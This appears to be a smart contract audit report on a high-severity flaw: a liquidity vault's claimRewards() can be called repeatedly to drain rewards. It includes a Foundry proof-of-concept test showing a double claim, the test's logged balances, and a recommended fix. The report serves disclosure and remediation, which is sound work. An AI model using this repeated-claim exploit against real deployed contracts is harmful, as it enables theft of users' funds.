# [H] - claimRewards() can be called multiple times by the same person

## Summary
An attacker can easily drain the contract by calling the `claimRewards()` function multiple times. 

## Vulnerability Detail
The `claimRewards()` function does not check whether a person has already claimed their rewards. It only updates how much rewards each user claims using the mapping `userRewardDebts`
And because of this it's easy to call `claimRewards` multiple times and drain the contract.
Here's a small test to prove this:
```solidity
function testCorrectness_claimRewardsTwice() public {
        // Setup
        _withdrawTimeSetUp();
        console.log("TOTAL INTERNAL REWARDS",ldo.balanceOf(address(liquidityVault)));
        console.log("TOTAL EXTERNAL REWARDS",externalReward.balanceOf(address(liquidityVault)));

        // Claim rewards twice
        vm.prank(alice);
        liquidityVault.claimRewards();
        console.log("Internal Reward Token Balance of alice after 1st Claim",ldo.balanceOf(alice));
        console.log("External Reward Token Balance of alice after 1st Claim",externalReward.balanceOf(alice));

        vm.prank(alice);
        liquidityVault.claimRewards();
        console.log("Internal Reward Token Balance of alice after 2nd Claim",ldo.balanceOf(alice));
        console.log("External Reward Token Balance of alice after 2nd Claim",externalReward.balanceOf(alice));
    }
```
And here's the output after running the test:
```solidity
[PASS] testCorrectness_claimRewardsTwice() (gas: 981566)
Logs:
  TOTAL INTERNAL REWARDS 100000000000000000000000
  TOTAL EXTERNAL REWARDS 1000000000000000000
  Internal Reward Token Balance of alice after 1st Claim 9999999999999999982
  External Reward Token Balance of alice after 1st Claim 999999999999999976
  Internal Reward Token Balance of alice after 2nd Claim 19999999999999999954
  External Reward Token Balance of alice after 2nd Claim 2999999999999999928
```
## Impact
An attacker can drain the contract completely

## Tool used
Manual review, Foundry

## Recommendation
Recommend adding a state variable to track maximum amount a user can claim. 
Reduce the amount whenever a user claims and also add a check in `claimRewards` to see if it does not exceed that amount.
